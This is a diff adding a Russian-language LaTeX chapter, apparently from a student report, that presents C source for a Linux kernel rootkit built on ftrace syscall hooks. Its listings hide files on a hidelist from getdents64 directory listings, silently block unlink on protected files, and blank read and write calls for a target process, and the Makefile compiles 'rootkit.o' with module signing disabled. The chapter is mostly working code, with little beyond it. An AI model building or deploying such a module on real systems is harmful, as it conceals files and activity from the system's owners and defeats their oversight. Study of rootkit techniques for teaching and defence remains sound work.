@@ -1,0 +1,175 @@
+\chapter{Технологический раздел}
+
+\section{Выбор языка и среды программирования}
+
+В качестве языка программирования был выбран язык Си. Для сборки модуля использовалась утилита make. В качестве среды программирования был выбран VSCode.
+
+\section{Реализация алгоритма проверки необходимости сокрытия файла}
+
+В листинге 3.1 приведена реализация алгоритма проверки необходимости сокрытия файла.
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки необходимости сокрытия файла}]
+static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
+{
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+	struct linux_dirent64 *previous_dir = NULL, *current_dir, *dirent_ker = NULL;
+	unsigned long offset = 0;
+	int ret = real_sys_getdents64(regs);
+	
+	if (ret <= 0)
+	{
+		return ret;
+	}
+	
+	dirent_ker = kmalloc(ret, GFP_KERNEL);
+	
+	if (dirent_ker == NULL)
+	{
+		return ret;
+	}
+	
+	if (copy_from_user(dirent_ker, dirent, ret) != 0)
+	{
+		kfree(dirent_ker);
+		return ret;
+	}
+	
+	while (offset < ret)
+	{
+		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
+		
+		if (check_fs_hidelist(current_dir->d_name))
+		{
+			if (current_dir == dirent_ker)
+			{
+				ret -= current_dir->d_reclen;
+				memmove(current_dir, (void *)current_dir + 
+				current_dir->d_reclen, ret);
+				continue;
+			}
+			if (previous_dir)
+			{
+				previous_dir->d_reclen += current_dir->d_reclen;
+			}
+		}
+		else
+		{
+			previous_dir = current_dir;
+		}
+		offset += current_dir->d_reclen;
+	}
+	if (copy_to_user(dirent, dirent_ker, ret) != 0)
+	{
+		kfree(dirent_ker);
+		return ret;
+	}
+	kfree(dirent_ker);
+	return ret;
+}
+\end{lstlisting}
+
+\section{Реализация алгоритма проверки разрешения на удаление файла}
+
+Реализация алгоритма проверки разрешения на удаление файла представлена в листинге 3.2.
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки разрешения на удаление файла}]
+static asmlinkage long fh_sys_unlink(struct pt_regs *regs)
+{
+	long ret = 0;
+	char *kernel_filename = get_filename((void*) regs->di);
+	
+	if (!kernel_filename)
+	{
+		return real_sys_unlink(regs);
+	}
+	
+	if (check_fs_blocklist(kernel_filename))
+	{
+		ret = 0;
+		kfree(kernel_filename);
+		return ret;
+	}
+	
+	kfree(kernel_filename);
+	ret = real_sys_unlink(regs);
+	
+	return ret;
+}
+\end{lstlisting}
+
+\section{Реализация алгоритма проверки разрешения на чтение из файла}
+
+Реализация алгоритма проверки разрешения на чтение из файла представлена в листинге 3.3.
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки разрешения на чтение из файла}]
+static asmlinkage long fh_sys_read(struct pt_regs *regs)
+{
+	long ret = 0;
+	struct task_struct *task = current;
+	
+	if (task->pid == target_pid && regs->di == target_fd)
+	{
+		return 0;
+	}
+	
+	ret = real_sys_read(regs);
+	return ret;
+}
+\end{lstlisting}
+
+\section{Реализация алгоритма проверки разрешения на запись в файл}
+
+Реализация алгоритма проверки разрешения на запись в файл представлена в листинге 3.4.
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки разрешения на запись в файл}]
+static asmlinkage long fh_sys_write(struct pt_regs *regs)
+{
+	long ret = 0;
+	struct task_struct *task;
+	task = current;
+	
+	if (task->pid == target_pid && regs->di == target_fd)
+	{
+		return 0;
+	}
+	
+	ret = real_sys_write(regs);
+	return ret;
+}
+\end{lstlisting}
+
+\section{Инициализация полей структуры ftrace\_hook}
+
+Инициализация полей структуры ftrace\_hook представлена в листинге 3.5.
+
+\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Инициализация полей структуры ftrace\_hook}]
+static struct ftrace_hook demo_hooks[] = {
+	HOOK("write", fh_sys_write, &real_sys_write),
+	HOOK("read", fh_sys_read, &real_sys_read),
+	HOOK("open", fh_sys_open, &real_sys_open),
+	HOOK("unlink", fh_sys_unlink, &real_sys_unlink),
+	HOOK("getdents64", fh_sys_getdents64, &real_sys_getdents64)
+};
+\end{lstlisting}
+
+\section{Makefile}
+
+В листинге 3.6 представлен Makefile.
+
+\begin{lstlisting}[language=make, frame=single, numbers=left, caption={Makefile}]
+CONFIG_MODULE_SIG=0
+PWD := $(shell pwd)
+KDIR_PATH ?= /lib/modules/$(shell uname -r)/build
+
+obj-m += my_module.o
+my_module-objs := main.o rootkit.o
+
+ccflags-y := -Wall -Wno-unused-result -Wno-unused-function -Wno-unused-variable
+
+all:
+$(MAKE) -C $(KDIR_PATH) M=$(PWD) modules
+
+clean:
+$(MAKE) -C $(KDIR_PATH) M=$(PWD) clean
+\end{lstlisting}
+
